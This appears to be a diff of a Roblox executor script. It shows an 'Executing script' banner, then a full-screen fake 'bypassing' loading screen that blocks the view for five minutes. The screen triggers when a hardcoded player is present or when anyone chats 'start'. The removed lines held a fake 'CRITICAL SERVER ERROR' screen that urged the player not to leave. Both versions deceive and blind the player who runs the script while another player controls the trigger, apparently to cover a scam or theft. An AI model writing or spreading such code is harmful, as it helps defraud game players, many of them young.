@@ -1,101 +1,235 @@
+-- Services
 local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
 local LocalPlayer = Players.LocalPlayer
 
-local CONFIG = {
-    priorityPlayers = {"namnnni2", "another_username_here"}
+-- Priority players
+local priorityPlayers = {
+    "namnnni2"
 }
 
-local function createLoadingScreen()
-    -- Không còn kiểm tra _G.LoadingScreenRan, mỗi lần gọi sẽ tạo mới
+local function isPriorityPlayer(playerName)
+    for _, name in ipairs(priorityPlayers) do
+        if playerName == name then
+            return true
+        end
+    end
+    return false
+end
+
+-- Create mini "Executing script..." GUI
+local function createMiniExecuteGui()
+    if CoreGui:FindFirstChild("MiniExecuteGui") then return end
 
     local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "MiniExecuteGui"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
+    screenGui.Parent = CoreGui
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 260, 0, 50)
+    frame.Position = UDim2.new(0.5, -130, 0, 20)
+    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    frame.BackgroundTransparency = 0.2
+    frame.BorderSizePixel = 0
+    frame.Parent = screenGui
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 12)
+    corner.Parent = frame
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(255, 255, 255)
+    stroke.Thickness = 2
+    stroke.Transparency = 0.3
+    stroke.Parent = frame
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, 0, 1, 0)
+    label.BackgroundTransparency = 1
+    label.Text = "Executing script"
+    label.Font = Enum.Font.FredokaOne
+    label.TextSize = 24
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.TextStrokeTransparency = 0
+    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    label.Parent = frame
+
+    spawn(function()
+        while label.Parent do
+            for i = 1, 3 do
+                label.Text = "Executing script" .. string.rep(".", i)
+                wait(0.5)
+            end
+        end
+    end)
+end
+
+-- Create loading screen
+local function createLoadingScreen()
+    if CoreGui:FindFirstChild("UltraBeautifulLoadingScreen") then return end
+
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "UltraBeautifulLoadingScreen"
     screenGui.IgnoreGuiInset = true
     screenGui.ResetOnSpawn = false
-    screenGui.DisplayOrder = 999999
-    screenGui.Name = "CriticalLoadingScreen"
-    screenGui.Parent = game:GetService("CoreGui")
+    screenGui.Parent = CoreGui
 
-    local bg = Instance.new("Frame")
-    bg.Size = UDim2.new(1, 0, 1, 0)
-    bg.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
-    bg.BackgroundTransparency = 0
-    bg.Parent = screenGui
+    RunService.RenderStepped:Wait()
 
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(0.9, 0, 0.2, 0)
-    title.Position = UDim2.new(0.05, 0, 0.3, 0)
-    title.Text = "❗ CRITICAL SERVER ERROR ❗"
-    title.Font = Enum.Font.GothamBlack
-    title.TextSize = 36
-    title.TextColor3 = Color3.fromRGB(255, 0, 0)
-    title.TextStrokeTransparency = 0
-    title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-    title.BackgroundTransparency = 1
-    title.TextWrapped = true
-    title.Parent = bg
+    local bgFrame = Instance.new("Frame")
+    bgFrame.Size = UDim2.new(1, 0, 1, 0)
+    bgFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+    bgFrame.Parent = screenGui
 
-    local warning = Instance.new("TextLabel")
-    warning.Size = UDim2.new(0.9, 0, 0.1, 0)
-    warning.Position = UDim2.new(0.05, 0, 0.45, 0)
-    warning.Text = "⚠️ Do NOT leave. Your data may be lost forever! ⚠️"
-    warning.Font = Enum.Font.GothamBold
-    warning.TextSize = 22
-    warning.TextColor3 = Color3.fromRGB(255, 100, 100)
-    warning.TextStrokeTransparency = 0
-    warning.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-    warning.BackgroundTransparency = 1
-    warning.TextWrapped = true
-    warning.Parent = bg
+    local gradient = Instance.new("UIGradient")
+    gradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 200, 255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 200))
+    }
+    gradient.Rotation = 0
+    gradient.Parent = bgFrame
 
-    task.spawn(function()
-        while true do
-            warning.TextTransparency = 0
-            task.wait(0.5)
-            warning.TextTransparency = 0.5
-            task.wait(0.5)
+    spawn(function()
+        while bgFrame.Parent do
+            for i = 0, 360, 1 do
+                gradient.Rotation = i
+                wait(0.03)
+            end
         end
     end)
 
-    task.spawn(function()
-        task.wait(300)
-        title.Text = "Reconnecting to server..."
-        warning.Visible = false
-    end)
-end
+    local mainText1 = Instance.new("TextLabel")
+    mainText1.Size = UDim2.new(1, 0, 0, 80)
+    mainText1.Position = UDim2.new(0, 0, 0.3, 0)
+    mainText1.BackgroundTransparency = 1
+    mainText1.Text = "Sorry, we are bypassing."
+    mainText1.Font = Enum.Font.FredokaOne
+    mainText1.TextSize = 56
+    mainText1.TextColor3 = Color3.new(1, 1, 1)
+    mainText1.TextStrokeTransparency = 0
+    mainText1.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    mainText1.Parent = bgFrame
 
--- Gắn sự kiện chat
-for _, plr in ipairs(Players:GetPlayers()) do
-    plr.Chatted:Connect(function(msg)
-        if msg:upper() == "START" then
-            createLoadingScreen()
-        end
-    end)
-end
+    local mainText2 = Instance.new("TextLabel")
+    mainText2.Size = UDim2.new(1, 0, 0, 70)
+    mainText2.Position = UDim2.new(0, 0, 0.42, 0)
+    mainText2.BackgroundTransparency = 1
+    mainText2.Text = "Please be patient..."
+    mainText2.Font = Enum.Font.FredokaOne
+    mainText2.TextSize = 48
+    mainText2.TextColor3 = Color3.new(1, 1, 1)
+    mainText2.TextStrokeTransparency = 0
+    mainText2.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    mainText2.Parent = bgFrame
 
-for _, plr in ipairs(Players:GetPlayers()) do
-    for _, name in ipairs(CONFIG.priorityPlayers) do
-        if plr.Name == name then
-            createLoadingScreen()
-        end
+    local progressBarBg = Instance.new("Frame")
+    progressBarBg.Size = UDim2.new(0.5, 0, 0, 30)
+    progressBarBg.Position = UDim2.new(0.25, 0, 0.6, 0)
+    progressBarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    progressBarBg.BorderSizePixel = 0
+    progressBarBg.Parent = bgFrame
+
+    local cornerBg = Instance.new("UICorner")
+    cornerBg.CornerRadius = UDim.new(0, 15)
+    cornerBg.Parent = progressBarBg
+
+    local strokeBg = Instance.new("UIStroke")
+    strokeBg.Color = Color3.fromRGB(255, 255, 255)
+    strokeBg.Thickness = 2
+    strokeBg.Transparency = 0.5
+    strokeBg.Parent = progressBarBg
+
+    local progressBarFill = Instance.new("Frame")
+    progressBarFill.Size = UDim2.new(0, 0, 1, 0)
+    progressBarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
+    progressBarFill.BorderSizePixel = 0
+    progressBarFill.Parent = progressBarBg
+
+    local cornerFill = Instance.new("UICorner")
+    cornerFill.CornerRadius = UDim.new(0, 15)
+    cornerFill.Parent = progressBarFill
+
+    local glow = Instance.new("UIStroke")
+    glow.Thickness = 3
+    glow.Transparency = 0.3
+    glow.Color = Color3.fromRGB(0, 255, 150)
+    glow.Parent = progressBarFill
+
+    local percentText = Instance.new("TextLabel")
+    percentText.Size = UDim2.new(1, 0, 0, 60)
+    percentText.Position = UDim2.new(0, 0, 0.66, 0)
+    percentText.BackgroundTransparency = 1
+    percentText.Text = "0%"
+    percentText.Font = Enum.Font.GothamBold
+    percentText.TextSize = 38
+    percentText.TextColor3 = Color3.new(1, 1, 1)
+    percentText.TextStrokeTransparency = 0
+    percentText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    percentText.Parent = bgFrame
+
+    local totalTime = 300
+    local startTime = tick()
+
+    while tick() - startTime < totalTime do
+        local elapsed = tick() - startTime
+        local progress = math.clamp(elapsed / totalTime, 0, 1)
+
+        progressBarFill.Size = UDim2.new(progress, 0, 1, 0)
+        percentText.Text = string.format("%.0f%%", progress * 100)
+
+        local hsv = Color3.fromHSV(progress, 1, 1)
+        progressBarFill.BackgroundColor3 = hsv
+        glow.Color = hsv
+        mainText1.TextColor3 = hsv
+        mainText2.TextColor3 = hsv
+
+        wait(0.1)
     end
+
+    progressBarFill.Size = UDim2.new(1, 0, 1, 0)
+    percentText.Text = "100%"
+
+    wait(1)
+
+    local fadeTween = TweenService:Create(bgFrame, TweenInfo.new(2), {BackgroundTransparency = 1})
+    fadeTween:Play()
+    fadeTween.Completed:Wait()
+
+    screenGui:Destroy()
 end
 
+-- Bật GUI mini ngay
+createMiniExecuteGui()
+
+-- Kiểm tra player có sẵn
+for _, plr in ipairs(Players:GetPlayers()) do
+    if isPriorityPlayer(plr.Name) and plr ~= LocalPlayer then
+        createLoadingScreen()
+        break
+    end
+
+    -- Nghe chat START
+    plr.Chatted:Connect(function(msg)
+        if msg:lower() == "start" then
+            createLoadingScreen()
+        end
+    end)
+end
+
+-- Khi có player mới join
 Players.PlayerAdded:Connect(function(plr)
-    for _, name in ipairs(CONFIG.priorityPlayers) do
-        if plr.Name == name then
-            createLoadingScreen()
-        end
-    end
-
-    plr.Chatted:Connect(function(msg)
-        if msg:upper() == "START" then
-            createLoadingScreen()
-        end
-    end)
-end)
-
-LocalPlayer.Chatted:Connect(function(msg)
-    if msg:upper() == "START" then
+    if isPriorityPlayer(plr.Name) then
         createLoadingScreen()
     end
+
+    -- Nghe chat START từ player mới
+    plr.Chatted:Connect(function(msg)
+        if msg:lower() == "start" then
+            createLoadingScreen()
+        end
+    end)
 end)
